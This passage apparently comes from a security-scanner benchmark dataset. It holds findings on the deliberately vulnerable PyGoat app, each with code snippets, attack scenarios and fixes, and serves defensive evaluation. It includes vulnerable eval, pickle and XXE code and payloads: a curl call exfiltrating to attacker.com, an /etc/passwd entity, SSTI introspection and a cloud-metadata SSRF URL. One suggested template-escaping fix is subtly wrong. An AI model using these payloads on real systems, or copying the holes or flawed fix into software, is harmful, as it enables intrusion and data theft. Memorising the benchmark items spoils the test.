SSRF-exposed (e.g., accepts arbitrary URLs or proxies requests), or if the attacker can influence the target’s behavior via the CSRF token, the attacker may:\n   - Trigger internal service interactions (e.g., with Kubernetes metadata, Redis, or admin panels),\n   - Bypass CSRF protections by injecting valid tokens,\n   - Cause unintended side effects (e.g., state changes, data exfiltration) via the PATCH request.\n6. Post-condition: Attacker achieves unauthorized interaction with internal endpoints or manipulates CSRF-protected endpoints using stolen/forged tokens.\n\n## Recommendation\nPrimary fix: Replace the hardcoded URL with a strict allow-list of known-safe destinations, and validate all URL components (scheme, host, path) before use. Block private, loopback, and metadata IP ranges (e.g., `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `::1`, `fc00::/7`) using a URL validation library (e.g., `urllib3.util.parse_url` + IP check). Additionally, never include user-controlled tokens in requests to internal endpoints — validate CSRF tokens server-side only.\n\nDefense in depth: Use a dedicated HTTP client with SSRF protection (e.g., `requests` with a custom `HTTPAdapter` that blocks internal IPs), or deploy a network-level SSRF blocker (e.g., egress firewall, webhook proxy). Sanitize and validate all user inputs before writing to files or using in network calls.\n\nReferences: CWE-918, OWASP A10:2021-SSRF, SWC-136",
+  "documented_entries_for_this_file": []
+ },
+ {
+  "id": "pygoat-0103",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/views.py",
+  "line": 981,
+  "end_line": 996,
+  "rule_id": "request-data-write",
+  "cwe": [
+   "CWE-93: Improper Neutralization of CRLF Sequences ('CRLF Injection')"
+  ],
+  "scanner_message": "Found user-controlled request data passed into '.write(...)'. This could be dangerous if a malicious actor is able to control data into sensitive files. For example, a malicious actor could force rolling of critical log files, or cause a denial-of-service by using up available disk space. Instead, ensure that request data is properly escaped or sanitized.",
+  "snippet": "            return render(request,\"Lab_2021/A3_Injection/ssti_lab.html\", {\"blogs\":users_blogs})\n        elif request.method==\"POST\":\n            blog = request.POST[\"blog\"]\n            id = str(uuid.uuid4()).split('-')[-1]\n\n            blog = filter_blog(blog)\n            prepend_code = \"{% extends 'introduction/base.html' %}\\\n                {% block content %}{% block title %}\\\n                <title>SSTI-Blogs</title>\\\n                {% endblock %}\"\n            \n            blog = prepend_code + blog + \"{% endblock %}\"\n            new_blog = Blogs.objects.create(author = request.user, blog_id = id)\n            new_blog.save() \n            dirname = os.path.dirname(__file__)\n            filename = os.path.join(dirname, f\"templates/Lab_2021/A3_Injection/Blogs/{id}.html\")\n            file = open(filename, \"w+\") \n            file.write(blog)\n            file.close()\n            return redirect(f'blog/{id}')",
+  "detector_analysis": "Confirmed: yes  \nSeverity: high  \n\n## Impact  \nAn attacker can inject arbitrary CRLF sequences into the `blog` POST parameter, which are written unescaped into a new HTML template file under `templates/Lab_2021/A3_Injection/Blogs/{id}.html`. Because the file is later served as a Django template (via `ssti_view_blog`), the injected CRLF can be used to inject additional template directives — effectively enabling Server-Side Template Injection (SSTI) and arbitrary code execution via Django’s template engine. The invariant violated is *input sanitization for template content*, and the asset at risk is the integrity and confidentiality of the application server (via arbitrary Python code execution in the template context).\n\n## Attack Scenario  \n1. Attacker sends a POST request to `/ssti_lab/` with `blog` containing CRLF and Django template syntax, e.g. `blog=%0A{{config}}%0A{{\"\".__class__.__mro__[1].__subclasses__()}}`.  \n2. In `introduction/views.py::ssti_lab` line 12, `blog = request.POST[\"blog\"]` assigns the raw user input.  \n3. Line 17 calls `filter_blog(blog)`, but `introduction/utility.py::filter_blog` (lines 1–2) returns the input unchanged — no sanitization occurs.  \n4. Lines 18–22 prepend/append Django template boilerplate, but the attacker’s CRLF and template expressions remain intact inside `blog`.  \n5. Line 28 opens `filename` (e.g., `templates/Lab_2021/A3_Injection/Blogs/abc123.html`) and writes the unsanitized `blog` string (line 29).  \n6. When `ssti_view_blog` later renders `Blogs/{id}.html` as a template, Django interprets the injected `{{...}}` blocks, executing arbitrary Python expressions (e.g., `config`, class introspection, or `os.system()` if `os` is in context).  \n7. Post-condition: attacker achieves arbitrary code execution on the server via template rendering.\n\n## Recommendation  \n**Primary fix**: Sanitize user input before embedding in template content. Replace `filter_blog` with a strict whitelist or escaping function that removes or encodes `{`, `}`, `%`, `{%`, `{{`, and CRLF sequences. For example:  \n```python\ndef filter_blog(code):\n    # Remove or escape dangerous template delimiters and control chars\n    code = code.replace('{%', '{{{')\n    code = code.replace('}}', '}}}')\n    code = code.replace('\\r', '').replace('\\n', ' ')\n    return code\n```  \n**Defense in depth**: Use Django’s `mark_safe()` only on vetted content, and avoid writing user input to template files entirely — store raw blog content in the database and render via a fixed template with `{{ blog_content|safe }}` only after escaping.  \n**References**: CWE-93, OWASP A3:2017 (SSTI), Django Template Security Guidelines.",
+  "documented_entries_for_this_file": [
+   {
+    "id": "SQL Injection",
+    "file": "introduction/views.py",
+    "category": "sql_injection"
+   },
+   {
+    "id": "Command Injection (subprocess shell=True)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Command Injection (eval)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Insecure Deserialization (pickle)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "XXE Injection",
+    "file": "introduction/views.py",
+    "category": "xxe"
+   },
+   {
+    "id": "XSS Reflected (Lab1)",
+    "file": "introduction/views.py",
+    "category": "xss"
+   },
+   {
+    "id": "Broken Access Control (cookie)",
+    "file": "introduction/views.py",
+    "category": "broken_access_control"
+   },
+   {
+    "id": "YAML Deserialization (A9)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "SSRF",
+    "file": "introduction/views.py",
+    "category": "ssrf"
+   }
+  ]
+ },
+ {
+  "id": "pygoat-0014",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "dockerized_labs/insec_des_lab/main.py",
+  "line": 36,
+  "end_line": 36,
+  "rule_id": "python-insecure-deserialization",
+  "cwe": "CWE-502",
+  "scanner_message": "Insecure deserialization (pickle / yaml.load with Loader / marshal). Deserializing untrusted data executes arbitrary code. Use json or yaml.safe_load.",
+  "snippet": "        decoded_data = base64.b64decode(serialized_data)\n        # Intentionally vulnerable deserialization, matching PyGoat\n        user = pickle.loads(decoded_data)\n        \n        if isinstance(user, User):",
+  "detector_analysis": "Confirmed: yes\nSeverity: critical\n\n## Impact\nAn attacker can achieve remote code execution (RCE) by crafting a malicious pickle payload and submitting it via the `serialized_data` form field in `dockerized_labs/insec_des_lab/main.py::deserialize_data`. Because `pickle.loads()` is used on untrusted input, an attacker can instantiate arbitrary classes with custom `__reduce__` methods (e.g., `os.system`, `subprocess.Popen`) to execute arbitrary shell commands on the server — directly compromising confidentiality (leaking secrets like `ADMIN_KEY_123`), integrity (full system compromise), and availability (service shutdown).\n\n## Attack Scenario\n1. Attacker crafts a malicious pickle payload using Python’s `__reduce__` protocol — for example, returning `('os.system', ('whoami',))` or equivalent to spawn a reverse shell.\n2. Attacker base64-encodes the payload and submits it as the `serialized_data` parameter in a POST request to the `deserialize_data` endpoint (line 3–4 in `dockerized_labs/insec_des_lab/main.py`).\n3. The endpoint decodes the base64 string (line 4) and passes it to `pickle.loads()` (line 6), which reconstructs the object and executes the embedded command during deserialization.\n4. The server responds with output from the command (e.g., `Invalid user data` or error message), leaking command output or enabling full RCE.\n\n## Recommendation\nPrimary fix: Replace `pickle.loads()` with a safe deserialization mechanism such as `json.loads()` for structured data, or use a secure serialization format like `msgpack` with strict type schemas. If legacy pickle is unavoidable (e.g., internal trusted data), restrict deserialization to a whitelist of allowed classes using `pickle.Unpickler.find_class()` — but this is strongly discouraged for untrusted input.\n\nDefense in depth: Implement input validation (e.g., reject non-JSON payloads), add rate limiting, and log deserialization attempts for anomaly detection.\n\nReferences: CWE-502, OWASP A8:2017 (Insecure Deserialization), SWC-114",
+  "documented_entries_for_this_file": []
+ },
+ {
+  "id": "pygoat-0009",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/mitre.py",
+  "line": 218,
+  "end_line": 218,
+  "rule_id": "python-eval-exec",
+  "cwe": "CWE-95",
+  "scanner_message": "eval()/exec() on a value — arbitrary code execution if any part is user-controlled. Use ast.literal_eval or an explicit dispatch table.",
+  "snippet": "    if request.method == \"POST\":\n        expression = request.POST.get('expression')\n        result = eval(expression)\n        return JsonResponse({'result': result})\n    else:",
+  "detector_analysis": "Confirmed: yes\nSeverity: critical\n\n## Impact\nAn attacker can execute arbitrary Python code on the server via the `mitre_lab_25_api` function in `introduction/mitre.py` (line 3–7), which directly passes unsanitized user input to `eval()`. This violates integrity and availability: the attacker can read/write arbitrary files, exfiltrate environment variables or secrets, spawn reverse shells, or compromise the entire host. The invariant at risk is \"no user-controlled input may be evaluated as code\".\n\n## Attack Scenario\n1. Attacker sends a POST request to `/mitre/25/lab/api/` (the endpoint handled by `mitre_lab_25_api`).\n2. The handler extracts the `expression` field from `request.POST` (line 4).\n3. The handler passes `expression` directly to `eval()` (line 5), which interprets and executes arbitrary Python code in the server process.\n4. Example payload: `__import__('os').system('curl http://attacker.com/$(whoami)')` — this executes shell commands and exfiltrates the current user.\n5. Post-condition: arbitrary code execution with the privileges of the Django application process.\n\n## Recommendation\nPrimary fix: Replace `eval(expression)` with `ast.literal_eval(expression)` if only numeric/constant expressions are intended, or implement an explicit expression parser/dispatch table for allowed operations (e.g., `{'add': lambda a,b: a+b, 'sub': ...}`). For this lab, since the goal is likely arithmetic evaluation, use `ast.parse(expression, mode='eval')` followed by a whitelist-based AST visitor that rejects non-allowed nodes (e.g., `ast.BinOp`, `ast.Num`, `ast.UnaryOp` with `ast.Add`/`ast.Sub` only), and raise an exception for any other node type.\n\nCWE-95 (Code Injection) is a well-documented high-risk pattern; OWASP A03:2021-Injection explicitly covers this class. References: CWE-95, OWASP A03:2021-Injection, SWC-110.",
+  "documented_entries_for_this_file": []
+ },
+ {
+  "id": "pygoat-0025",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/playground/A6/soln.py",
+  "line": 9,
+  "end_line": 9,
+  "rule_id": "python-ssrf-requests",
+  "cwe": "CWE-918",
+  "scanner_message": "Outbound request to a URL assembled from input (SSRF). Validate against an allow-list; block internal/metadata addresses.",
+  "snippet": "        k = i.split(\"==\")\n        url = f\"https://pypi.org/pypi/{k[0]}/{k[1]}/json\"\n        response = requests.get(url)\n        response.raise_for_status()\n        info = response.json()",
+  "detector_analysis": "Confirmed: yes  \nSeverity: high  \n\n## Impact  \nAn attacker can trigger Server-Side Request Forgery (SSRF) via the `check_vuln` function in `introduction/playground/A6/soln.py` by passing a specially crafted module string (e.g., `\"module==1.0.0@http://169.254.169.254/latest/meta-data/\"`). This allows the application to fetch arbitrary URLs—including internal metadata endpoints (e.g., AWS EC2 metadata at `169.254.169.254`)—potentially leaking sensitive credentials, instance metadata, or internal network topology.\n\n## Attack Scenario  \n1. Attacker calls `check_vuln` (public function) with a list containing a malicious module string, e.g., `\"module==1.0.0@http://169.254.169.254/latest/meta-data/\"`.  \n2. In `check_vuln`, line 4: `k = i.split(\"==\")` splits the string into `k[0] = \"module\"`, `k[1] = \"1.0.0@http://169.254.169.254/latest/meta-data/\"`.  \n3. Line 5: `url = f\"https://pypi.org/pypi/{k[0]}/{k[1]}/json\"` constructs `https://pypi.org/pypi/module/1.0.0@http://169.254.169.254/latest/meta-data//json`.  \n4. The `requests.get(url)` call (line 6) sends the request to `pypi.org`, but many HTTP clients (including Python’s `requests`) interpret the `@` symbol as a user:password delimiter in the URL authority component, causing the actual host to resolve to `169.254.169.254`.  \n5. The server fetches the internal metadata endpoint and returns its contents, which are parsed as JSON (line 8), leaking secrets or internal info.  \n\n## Recommendation  \nPrimary fix: Sanitize and validate the module name and version before URL construction. Reject any input containing `@`, `:`, or non-alphanumeric characters in the version component, and strictly validate that the constructed URL uses only the `https://pypi.org` scheme and domain.  \nDefense in depth: Use `urllib.parse.urlparse` to validate scheme and host against an allow-list (`pypi.org` only), and block private IP ranges (e.g., `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`).  \nReferences: CWE-918, OWASP A10:2021-SSRF, SWC-136",
+  "documented_entries_for_this_file": []
+ },
+ {
+  "id": "pygoat-0037",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/views.py",
+  "line": 17,
+  "end_line": 17,
+  "rule_id": "use-defused-xml",
+  "cwe": [
+   "CWE-611: Improper Restriction of XML External Entity Reference"
+  ],
+  "scanner_message": "The Python documentation recommends using `defusedxml` instead of `xml` because the native Python `xml` library is vulnerable to XML External Entity (XXE) attacks. These attacks can leak confidential data and \"XML bombs\" can cause denial of service.",
+  "snippet": "from io import BytesIO\nfrom random import randint\nfrom xml.dom.pulldom import START_ELEMENT, parseString\nfrom xml.sax import make_parser\nfrom xml.sax.handler import feature_external_ges",
+  "detector_analysis": "Confirmed: yes  \nSeverity: high  \n\n## Impact  \nThe flagged code in `introduction/views.py` imports Python’s native `xml` modules (`xml.dom.pulldom`, `xml.sax`) without disabling external entity resolution, exposing the application to XML External Entity (XXE) attacks. An attacker could craft a malicious XML payload (e.g., via the `xxe`, `xxe_lab`, or `xxe_see` endpoints) to exfiltrate server-side files (e.g., `/etc/passwd`, `.env`, SSH keys), trigger denial-of-service via XML bombs (Billion Laughs), or perform Server-Side Request Forgery (SSRF) against internal services. This directly compromises confidentiality and availability of the host system.\n\n## Attack Scenario  \n1. The `xxe` and `xxe_lab` endpoints (public functions in `introduction/views.py`) likely accept XML input (e.g., via POST body) and parse it using `xml.dom.pulldom.parseString` or `xml.sax` handlers (lines 4–6 in the flagged import block).  \n2. By default, Python’s `xml.sax.make_parser()` and `parseString` enable external entity resolution unless explicitly disabled (CWE-611).  \n3. An attacker sends a POST request to `/xxe` with a payload like:  \n   ```xml\n   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n   <data>&xxe;</data>\n   ```  \n4. The parser resolves `&xxe;`, embedding `/etc/passwd` content into the parsed DOM or output, leaking sensitive file contents.  \n5. Alternatively, a \"Billion Laughs\" variant exhausts memory/CPU, causing a denial-of-service.  \n\nPost-condition: attacker reads arbitrary local files or crashes the service.\n\n## Recommendation  \nPrimary fix: Replace all `xml` imports with `defusedxml` equivalents and configure parsers to disable external entities. Specifically:  \n- Replace `from xml.dom.pulldom import START_ELEMENT, parseString` with `from defusedxml.pulldom import START_ELEMENT, parseString`  \n- Replace `from xml.sax import make_parser` and `from xml.sax.handler import feature_external_ges` with `from defusedxml.sax import make_parser` and disable external entities explicitly:  \n  ```python\n  parser = make_parser()\n  parser.setFeature(feature_external_ges, False)\n  parser.setFeature(\"http://xml.org/sax/features/external-general-entities\", False)\n  parser.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", False)\n  parser.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", False)\n  parser.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", True)\n  ```  \nDefense in depth: Sanitize and validate all XML inputs server-side; log and reject requests with `<!DOCTYPE` or `<!ENTITY` declarations.  \n\nReferences: CWE-611, OWASP A4:2017 (XXE), SWC-132",
+  "documented_entries_for_this_file": [
+   {
+    "id": "SQL Injection",
+    "file": "introduction/views.py",
+    "category": "sql_injection"
+   },
+   {
+    "id": "Command Injection (subprocess shell=True)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Command Injection (eval)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Insecure Deserialization (pickle)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "XXE Injection",
+    "file": "introduction/views.py",
+    "category": "xxe"
+   },
+   {
+    "id": "XSS Reflected (Lab1)",
+    "file": "introduction/views.py",
+    "category": "xss"
+   },
+   {
+    "id": "Broken Access Control (cookie)",
+    "file": "introduction/views.py",
+    "category": "broken_access_control"
+   },
+   {
+    "id": "YAML Deserialization (A9)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "SSRF",
+    "file": "introduction/views.py",
+    "category": "ssrf"
+   }
+  ]
+ },
+ {
+  "id": "pygoat-0032",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/views.py",
+  "line": 214,
+  "end_line": 214,
+  "rule_id": "avoid-insecure-deserialization",
+  "cwe": [
+   "CWE-502: Deserialization of Untrusted Data"
+  ],
+  "scanner_message": "Avoid using insecure deserialization library, backed by `pickle`, `_pickle`, `cpickle`, `dill`, `shelve`, or `yaml`, which are known to lead to remote code execution vulnerabilities.",
+  "snippet": "        else:\n            token = base64.b64decode(token)\n            admin = pickle.loads(token)\n            if admin.admin == 1:\n                response = render(request,'Lab/insec_des/insec_des_lab.html', {\"message\":\"Welcome Admin, SECRETKEY:ADMIN123\"})",
+  "detector_analysis": "Confirmed: yes\nSeverity: critical\n\n## Impact\nAn attacker can achieve remote code execution (RCE) by crafting a malicious pickle payload and injecting it as the `token` cookie. When `pickle.loads(token)` executes in `introduction/views.py::insec_des_lab` (line 12), it deserializes arbitrary Python objects, enabling full server compromise — including reading sensitive files, executing shell commands, or exfiltrating credentials like the exposed `SECRETKEY:ADMIN123` in the admin welcome message.\n\n## Attack Scenario\n1. Attacker crafts a malicious pickle payload that, when deserialized, executes arbitrary code (e.g., via `os.system` or `subprocess`).\n2. Attacker base64-encodes the payload and sets it as the `token` cookie in a request to `/insec_des_lab`.\n3. In `insec_des_lab`, line 10 decodes the cookie: `token = base64.b64decode(token)`.\n4. Line 12 deserializes the payload: `admin = pickle.loads(token)`, triggering code execution during deserialization.\n5. The attacker’s payload runs with the privileges of the Django application process (often the web server user), achieving full RCE.\n\n## Recommendation\nPrimary fix: Replace pickle-based token authentication with a cryptographically signed token (e.g., JWT using HS256/RS256) or Django’s built-in `signing` module (`django.core.signing.dumps/loads` with a secret key). Do NOT use pickle for untrusted data — even if the token is intended for internal use, it must be treated as untrusted if it originates from the client.\n\nDefense in depth: Rotate the `SECRETKEY:ADMIN123` immediately (it is hardcoded and exposed in the response), enforce strict input validation on cookies, and implement Content Security Policy (CSP) headers to mitigate secondary impacts of RCE.\n\nReferences: CWE-502, OWASP A8:2017 (Insecure Deserialization), SWC-112",
+  "documented_entries_for_this_file": [
+   {
+    "id": "SQL Injection",
+    "file": "introduction/views.py",
+    "category": "sql_injection"
+   },
+   {
+    "id": "Command Injection (subprocess shell=True)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Command Injection (eval)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Insecure Deserialization (pickle)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "XXE Injection",
+    "file": "introduction/views.py",
+    "category": "xxe"
+   },
+   {
+    "id": "XSS Reflected (Lab1)",
+    "file": "introduction/views.py",
+    "category": "xss"
+   },
+   {
+    "id": "Broken Access Control (cookie)",
+    "file": "introduction/views.py",
+    "category": "broken_access_control"
+   },
+   {
+    "id": "YAML Deserialization (A9)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "SSRF",
+    "file": "introduction/views.py",
+    "category": "ssrf"
+   }
+  ]
+ },
+ {
+  "id": "pygoat-0053",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "dockerized_labs/broken_auth_lab/app.py",
+  "line": 49,
+  "end_line": 49,
+  "rule_id": "secure-set-cookie",
+  "cwe": [
+   "CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute"
+  ],
+  "scanner_message": "Found a Flask cookie with insecurely configured properties.  By default the secure, httponly and samesite ar configured insecurely. cookies should be handled securely by setting `secure=True`, `httponly=True`, and `samesite='Lax'` in response.set_cookie(...). If these parameters are not properly set, your cookies are not properly protected and are at risk of being stolen by an attacker. Include the `secure=True`, `httponly=True`, `samesite='Lax'` arguments or set these to be true in the Flask configuration.",
+  "snippet": "        if remember_me:\n            # Vulnerable: Insecure \"Remember Me\" implementation\n            response.set_cookie('session', session_token, max_age=30*24*60*60)\n        else:\n            response.set_cookie('session', session_token)",
+  "detector_analysis": "Confirmed: yes\nSeverity: medium\n\n## Impact\nAn attacker can steal user session cookies via man-in-the-middle (MITM) or cross-site scripting (XSS) attacks because the `session` cookie is set without the `Secure`, `HttpOnly`, or `SameSite` attributes in `dockerized_labs/broken_auth_lab/app.py::login` (lines 17–20). This allows session hijacking, enabling unauthorized access to user accounts and the `dashboard` endpoint.\n\n## Attack Scenario\n1. User submits credentials to `/login` (public endpoint, `app.py::login`, lines 10–23).\n2. On successful authentication, the server sets a `session` cookie with `response.set_cookie(...)` (lines 17–20) without `secure=True`, `httponly=True`, or `samesite='Lax'`.\n3. If the user is on HTTP (not HTTPS), the cookie is transmitted in plaintext over the network — an attacker on the same network can capture it (MITM).\n4. If the app has any XSS vulnerability (e.g., in challenge rendering), JavaScript can read `document.cookie` and exfiltrate the session token because `HttpOnly=False`.\n5. The attacker replays the stolen token to impersonate the user and access `/dashboard` or other protected resources.\n\n## Recommendation\nPrimary fix: Update `response.set_cookie(...)` calls in `dockerized_labs/broken_auth_lab/app.py::login` to include `secure=True`, `httponly=True`, and `samesite='Lax'`. For example:\n```python\nresponse.set_cookie('session', session_token, max_age=30*24*60*60, secure=True, httponly=True, samesite='Lax')\n```\nand similarly for the `else` branch.\n\nDefense in depth: Enforce HTTPS site-wide (via Flask-WTF or middleware), set `SESSION_COOKIE_SECURE=True` and `SESSION_COOKIE_HTTPONLY=True` in Flask config, and avoid storing raw `username:timestamp` tokens — use cryptographically signed JWTs or server-side session stores.\n\nReferences: OWASP A01:2021 – Broken Access Control, CWE-614, SWC-128",
+  "documented_entries_for_this_file": []
+ },
+ {
+  "id": "pygoat-0036",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/views.py",
+  "line": 18,
+  "end_line": 18,
+  "rule_id": "use-defused-xml",
+  "cwe": [
+   "CWE-611: Improper Restriction of XML External Entity Reference"
+  ],
+  "scanner_message": "The Python documentation recommends using `defusedxml` instead of `xml` because the native Python `xml` library is vulnerable to XML External Entity (XXE) attacks. These attacks can leak confidential data and \"XML bombs\" can cause denial of service.",
+  "snippet": "from random import randint\nfrom xml.dom.pulldom import START_ELEMENT, parseString\nfrom xml.sax import make_parser\nfrom xml.sax.handler import feature_external_ges",
+  "detector_analysis": "Confirmed: yes  \nSeverity: high  \n\n## Impact  \nThe flagged code in `introduction/views.py` imports Python’s native `xml` modules (`xml.dom.pulldom`, `xml.sax`) without disabling external entity resolution, exposing the application to XML External Entity (XXE) attacks. An attacker could craft a malicious XML payload (e.g., via `xxe`, `xxe_lab`, or `xxe_see` endpoints) to exfiltrate server-side files (e.g., `/etc/passwd`, `.env`, SSH keys), perform server-side request forgery (SSRF) via external DTDs, or trigger billion-laughs-style denial-of-service. This directly compromises confidentiality and availability of the host system running the Django app.\n\n## Attack Scenario  \n1. Attacker sends a POST request to the `xxe` or `xxe_lab` endpoint (publicly accessible, per access control list) with a malicious XML body containing an external entity declaration, e.g.:  \n   ```xml\n   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><root>&xxe;</root>\n   ```  \n2. The `xxe_parse` function (implied by naming and context) uses `parseString` or `make_parser` without disabling external entities — specifically, `feature_external_ges` is imported but never disabled (line 4 imports it, but no call to `parser.setFeature(feature_external_ges, False)` is visible).  \n3. The native `xml.sax` or `xml.dom.pulldom` parser resolves the `SYSTEM` reference, reads `/etc/passwd`, and embeds its contents in the parsed document.  \n4. The response reflects the parsed content (e.g., via `render(request, 'template.html', {'data': parsed_data})`), leaking `/etc/passwd` to the attacker.  \nPost-condition: attacker reads arbitrary server files, violating confidentiality and potentially enabling privilege escalation or lateral movement.\n\n## Recommendation  \nPrimary fix: Replace all `xml.*` imports with `defusedxml` equivalents and explicitly disable external entities. For example:  \n```python\n# Replace:\nfrom xml.dom.pulldom import parseString\nfrom xml.sax import make_parser\nfrom xml.sax.handler import feature_external_ges\n# With:\nfrom defusedxml.pulldom import parseString\nfrom defusedxml.sax import make_parser\nparser = make_parser()\nparser.setFeature(feature_external_ges, False)\n```  \nDefense in depth: Sanitize all XML inputs using `defusedxml`’s `parse()` wrappers (e.g., `defusedxml.ElementTree.fromstring`) and apply input validation (e.g., reject non-whitelisted XML tags).  \nReferences: CWE-611, OWASP A4:2017 (XXE), SWC-132.",
+  "documented_entries_for_this_file": [
+   {
+    "id": "SQL Injection",
+    "file": "introduction/views.py",
+    "category": "sql_injection"
+   },
+   {
+    "id": "Command Injection (subprocess shell=True)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Command Injection (eval)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Insecure Deserialization (pickle)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "XXE Injection",
+    "file": "introduction/views.py",
+    "category": "xxe"
+   },
+   {
+    "id": "XSS Reflected (Lab1)",
+    "file": "introduction/views.py",
+    "category": "xss"
+   },
+   {
+    "id": "Broken Access Control (cookie)",
+    "file": "introduction/views.py",
+    "category": "broken_access_control"
+   },
+   {
+    "id": "YAML Deserialization (A9)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "SSRF",
+    "file": "introduction/views.py",
+    "category": "ssrf"
+   }
+  ]
+ },
+ {
+  "id": "pygoat-0067",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/apis.py",
+  "line": 112,
+  "end_line": 123,
+  "rule_id": "no-csrf-exempt",
+  "cwe": [
+   "CWE-352: Cross-Site Request Forgery (CSRF)"
+  ],
+  "scanner_message": "Detected usage of @csrf_exempt, which indicates that there is no CSRF token set for this route. This could lead to an attacker manipulating the user's account and exfiltration of private data. Instead, create a function without this decorator.",
+  "snippet": "\n#a6 codechecking api\n@csrf_exempt\ndef A6_disscussion_api(request):\n    test_bench = [\"Pillow==8.0.0\",\"PyJWT==2.4.0\",\"requests==2.28.0\",\"Django==4.0.4\"]\n    \n    try:\n        result = check_vuln(test_bench)\n        print(len(result))\n        if result:\n            return JsonResponse({\"message\":\"success\",\"vulns\":result},status = 200)\n        return JsonResponse({\"message\":\"failure\"},status = 400)\n    except Exception as e:\n        return JsonResponse({\"message\":\"failure\"},status = 400)\n\n@csrf_exempt",
+  "detector_analysis": "Confirmed: yes  \nSeverity: high  \n\n## Impact  \nThe `@csrf_exempt` decorator on `A6_disscussion_api` and `A7_disscussion_api` disables Django’s CSRF protection, allowing unauthenticated attackers to forge POST requests from authenticated users’ browsers. This enables account manipulation (e.g., triggering code analysis endpoints with malicious payloads) and potential exfiltration of session state or internal logic via the `check_vuln` function’s response. Specifically, an attacker could coerce a logged-in user into submitting arbitrary code snippets to `A7_disscussion_api`, which performs string-matching on user-provided code — a pattern that may be abused to probe internal session-handling logic or bypass security checks if combined with other flaws.\n\n## Attack Scenario  \n1. An attacker crafts a malicious HTML page containing a hidden `<form>` targeting `POST /apis/A7_disscussion_api/` with a `code` field containing one of the forbidden substrings (`AF_session_id.objects.get(sesssion_id = cookie).delete()` or `AF_session_id.objects.get(sesssion_id=cookie).delete()`).  \n2. The attacker诱导s an authenticated Django user (e.g., via phishing or XSS in another part of the app) to visit the malicious page.  \n3. The user’s browser automatically includes their session cookie with the forged POST request.  \n4. Because `@csrf_exempt` is present, Django skips CSRF validation and processes the request.  \n5. The `A7_disscussion_api` function checks for the presence of the forbidden substring in `request.POST['code']`. If matched, it returns `{\"message\":\"success\"}`, potentially revealing that the user’s session or code contains sensitive patterns (e.g., session deletion attempts), enabling further exploitation such as session hijacking or denial-of-service against user sessions.  \n\n## Recommendation  \nPrimary fix: Remove `@csrf_exempt` from both `A6_disscussion_api` and `A7_disscussion_api`, and ensure all POST endpoints use Django’s CSRF middleware (enabled by default). For API endpoints intended for non-browser clients, use token-based authentication (e.g., Django REST Framework’s `TokenAuthentication` or JWT) instead of session cookies, and apply CSRF protection only to session-authenticated views.  \nDefense in depth: Add `@csrf_protect` explicitly where needed, and audit all public POST endpoints for missing CSRF guards.  \nReferences: CWE-352, OWASP A5:2021",
+  "documented_entries_for_this_file": []
+ },
+ {
+  "id": "pygoat-0021",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "challenge/templates/challenge.html",
+  "line": 21,
+  "end_line": 21,
+  "rule_id": "template-django-jinja-safe-filter",
+  "cwe": "CWE-79",
+  "scanner_message": "Template variable rendered with the `|safe` filter (Django/Jinja) — this disables auto-escaping and yields stored/reflected XSS if the value is user-controlled. Remove `|safe`; escape on output.",
+  "snippet": "    var button2 = document.getElementById(\"cbtn-2\");\n    var url = null;\n    const csrf_token = \"{{ csrf_token|safe }}\";\n\n    function handleonclick() {",
